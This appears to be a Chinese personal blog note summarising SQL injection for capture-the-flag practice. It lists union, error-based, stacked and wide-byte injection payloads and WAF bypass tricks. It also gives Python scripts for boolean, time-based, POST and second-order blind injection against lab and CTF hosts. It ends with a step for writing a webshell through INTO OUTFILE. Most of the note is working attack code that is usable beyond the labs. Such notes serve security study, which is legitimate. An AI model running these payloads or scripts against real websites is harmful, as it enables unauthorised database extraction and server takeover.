---
title: "SQL小结"
date: 2021-07-20 00:00:00
updated: 2021-11-16 15:03:24
tags:
  - ctf
description: "笔记"
---

# SQL

闭合方式
‘ “ ) ‘) “) )) ‘)) “)) 等等

基本思路，找到注入点->判断注入类型->注入

## 基本语句

```
1' or 1=1 %23 //字符型注入

1' or 1=1 union select 1,2,3,4%23 //报错字段为3

-1'  union select 1,2,group_concat(schema_name) from information_schema.schemata%23  //爆全部库库名 

-1'  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'ctftraining'%23 //查库

-1'  union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'flag'%23 //查水表

-1'  union select 1,2,flag from ctftraining.flag%23 //跨库查询

// %23为 # 的url编码
```

## 报错注入

```
1' or updatexml(1,concat(0x26,database(),0x26),1)#

1' or updatexml(1,concat(0x26,(select right(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#

1' or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
左右拼接一下就是库名
····中间差不多不多赘述了

1' or updatexml(1,concat(0x26,(select left(flag,30) from ctftraining.flag),0x26),1)#

1' or updatexml(1,concat(0x26,(select right(flag,30) from ctftraining.flag),0x26),1)#
左右拼接一下就是flag

另一个函数 注：该函数一次只能查询32位长度
extractvalue(1,concat(0x26,(SQL语句),0x26));
```

## 盲注

脚本灵活应用

```python
import requests

url = "http://192.168.43.164/Less-62/index.php"

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # payload="?id=1')and if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),{},1))>{},1,0)%23".format(i,mid)
        payload="?id=1')and if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='challenges'),{},1))>{},1,0)%23".format(i,mid)
        # payload="?id=1')and if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='S3BCU54QBK'),{},1))>{},1,0)%23".format(i,mid)
        # payload="?id=1 and if(ascii(substr((seLect(secret_ATH5)from(challenges.S3BCU54QBK)),{},1))>{},1,0)%23".format(i,mid)
        # print(url+payload)

        r=requests.get(url+payload)

        if "Your Login name : Angelina" in r.text:
            head=mid+1
        else:
            tail=mid
    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 时间盲注

在盲注脚本上做点改动

```python
import requests

url = "http://583bbd02-c708-41eb-86ab-f792729f9843.node4.buuoj.cn/Less-53/?sort=1' and "

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        payload="if(ascii(substr(database(),{},1))>{},sleep(0.5),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctftraining'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select flag4s from ctfshow.flags),{},1))>{},sleep(0.5),0) %23".format(i,mid)
        # print(url+payload)
        # start_time=time.time()
        print(url+payload)
        r=requests.get(url+payload)

        #print(r.text)
        try:
            r = requests.get(url+payload,timeout=0.4)
            tail = mid

        except:
            head = mid + 1

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## post型盲注

```python
import requests
import time
url = "http://e4cb6dc3-7b2c-4c2a-913c-c7e1a9dae714.node4.buuoj.cn/Less-14/"

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # data={"uname": "1') or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1') or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        data={"uname": "1\" or if(ascii(substr((select flag from ctftraining.flag),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        
        r=requests.post(url=url,data=data)
        # print(r.text)
        time.sleep(1)
        if "flag.jpg" in r.text:
            head=mid+1
        else:
            tail=mid

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 二次注入

举例 注册处无注入，改密处出现注入
思路 跑脚本注册来实现注入

```python
import requests
session=requests.session()
i=0
result=""

for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        payload = f'if(ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0) #'
        # payload = f'if(ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.7),0)'
        # payload = 'if(ascii(substr((select group_concat(flag4s)from(ctfshow.flags)),{},1))>{},1,0)#'.format(i,mid)
        password = "admin' and {}".format(payload)
        
        
        # url1 = 'http://58962273-3e5b-4881-8bef-750836065431.challenge.ctf.show:8080/login_create.php'
        # data1 = {
        #     'username': username,
        #     'password': '1',
        #     're_password': '1',
        #     'submit': 'Register'
        # }
        # r1 = session.post(url1, data=data1)
        
        
        url2 = 'http://3878e6f6-d552-4c1d-9269-d2845b0877af.challenge.ctf.show:8080/login.php'
        data2 = {
            'login_user': 'admin',
            'login_password': password,
            'mysubmit': 'Login',
        }
        r2 = session.post(url2, data=data2)

        url3 = 'http://3878e6f6-d552-4c1d-9269-d2845b0877af.challenge.ctf.show:8080/logged-in.php'
        r3 = session.post(url=url3)

        if "admin" in r3.text:
            head=mid+1
        else:
            tail=mid


    if head !=32 and head !=127:
        result+=chr(head)
        print(head)
    else:
        break
    
    print(result)
```

## 堆叠注入

```
1';show databases;#
1';show tables;#
1';show columns from FlagHere;#
1'; HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
```

一个知识点：
HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭

读取FLAG的内容

## 宽字节注入

addslashes()转义
%df

## WAF

大小写绕过
空格绕过括号或/**/**/或者 tap %20
双写绕过
http参数污染
like代替= rlike
十六进制代替文字(过滤引号
select被过滤时用desc倒序查看字段也可以堆叠注入，或者预处理
编码绕过 二次编码

## 写入webshell

@@basedir
@@datadir
获取绝对路径
union select 1,2,’‘into outfile ‘路径’
